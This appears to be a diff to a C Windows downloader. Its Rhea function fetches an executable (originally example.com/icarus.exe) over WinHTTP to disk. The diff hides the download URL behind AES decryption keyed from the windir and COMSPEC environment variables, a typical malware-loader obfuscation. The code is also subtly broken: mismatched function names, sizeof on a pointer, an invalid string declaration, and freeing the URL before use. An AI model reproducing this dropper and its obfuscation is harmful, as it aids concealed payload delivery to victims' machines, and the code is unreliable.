@@ -4,6 +4,10 @@
 #include <winhttp.h>
 #include <stdbool.h>
 #include <sys/stat.h>
+#include <openssl/aes.h>
+#include <openssl/evp.h>
+#include <openssl/err.h>
+
 
 int main(){
 
@@ -72,8 +76,13 @@ char* Saint_Bear() {
 }
 
 int Rhea(char *path) {
-    const wchar_t *url = L"https://example.com/icarus.exe"; // fill in when needed ==================================================
+    char * txt= ""; // fill in when able ==================================================
+    char *varstr1= Voltzite(txt);
+
+    const wchar_t *url = L"%s", varstr1; 
     const wchar_t *out = path;
+
+    free(varstr1);
 
     URL_COMPONENTS uc = {0};
     uc.dwStructSize = sizeof(uc);
@@ -114,7 +123,100 @@ int Rhea(char *path) {
 }
 
 
+char * Voltzite(const unsigned char* cipherText){
+    unsigned char key[32];
+    unsigned char iv[16];
+    Group123(iv);
+    Black_Vine(key);
 
+    return sam(cipherText, sizeof(cipherText), key, sizeof(key), iv, sizeof(iv));
+}
+
+void Group123(unsigned char out[16]){
+    unsigned char buffer[MAX_PATH] = {0};
+    DWORD len = GetEnvironmentVariableA("windir", (char*)buffer, sizeof(buffer));
+
+    // Fill output with zeros first
+    for (int i = 0; i < 16; i++)
+        out[i] = 0x00;
+
+    if (len == 0 || len >= sizeof(buffer))
+        return;
+
+    size_t n = (len < 16) ? len : 16;
+    for (size_t i = 0; i < n; i++)
+        out[i] = buffer[i];
+}
+
+void Black_Vine(unsigned char out[32]){
+
+    unsigned char buffer[MAX_PATH] = {0};
+    DWORD len = GetEnvironmentVariableA("COMSPEC", (char*)buffer, sizeof(buffer));
+
+    // Fill output with zeros first
+    for (int i = 0; i < 32; i++)
+        out[i] = 0x00;
+
+    if (len == 0 || len >= sizeof(buffer))
+        return;
+
+    size_t n = (len < 32) ? len : 32;
+    for (size_t i = 0; i < n; i++)
+        out[i] = buffer[i];
+}
+
+char* Sam(const unsigned char* cipherText, int cipherTextLen, const unsigned char* Key, int KeyLen, const unsigned char* IV, int IVLen) {
+    if (cipherText == NULL || cipherTextLen <= 0) {
+        return NULL;
+    }
+    if (Key == NULL || KeyLen <= 0) {
+        return NULL;
+    }
+    if (IV == NULL || IVLen <= 0) {
+        return NULL;
+    }
+
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    if (!ctx) {
+        return NULL;
+    }
+
+    // Initialize decryption operation with AES CBC mode
+    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, Key, IV) != 1) {
+        EVP_CIPHER_CTX_free(ctx);
+        return NULL;
+    }
+
+    unsigned char* plaintext = malloc(cipherTextLen + AES_BLOCK_SIZE);
+    if (!plaintext) {
+        EVP_CIPHER_CTX_free(ctx);
+        return NULL;
+    }
+
+    int len = 0;
+    int plaintext_len = 0;
+
+    if (EVP_DecryptUpdate(ctx, plaintext, &len, cipherText, cipherTextLen) != 1) {
+        free(plaintext);
+        EVP_CIPHER_CTX_free(ctx);
+        return NULL;
+    }
+    plaintext_len = len;
+
+    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
+        free(plaintext);
+        EVP_CIPHER_CTX_free(ctx);
+        return NULL;
+    }
+    plaintext_len += len;
+
+    EVP_CIPHER_CTX_free(ctx);
+
+    // Null-terminate the plaintext string
+    plaintext[plaintext_len] = '\0';
+
+    return (char*)plaintext;
+}
 
 
 
